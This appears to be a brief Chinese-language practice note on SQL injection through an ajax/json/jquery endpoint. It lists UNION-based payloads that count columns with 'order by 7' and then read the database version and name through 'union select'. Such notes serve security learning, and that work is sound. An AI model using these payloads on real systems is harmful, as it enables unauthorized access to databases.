# sql ajax/json/jquery 注入

## 探测

直接在url里输入即可

首先还是探测长度

1 输入'order by 7 -- # 时发现被排序,所以总共有7个数据显示处

2 修改为'union select 1,2,3,4,5,6,7 -- # 形式

3 'union select 1,version(),3,4,database(),6,7 -- # 探测数据库与版A

后续部分与get基础操作一致接口完成任务

